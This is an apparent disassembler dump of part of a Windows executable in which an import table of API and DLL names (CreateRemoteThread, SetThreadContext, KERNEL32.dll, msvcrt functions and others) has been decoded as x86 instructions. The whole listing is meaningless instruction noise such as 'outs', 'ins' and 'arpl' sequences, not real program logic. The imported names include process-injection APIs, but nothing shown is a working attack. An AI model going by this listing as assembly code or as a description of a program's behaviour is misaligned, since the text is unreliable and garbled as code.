  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
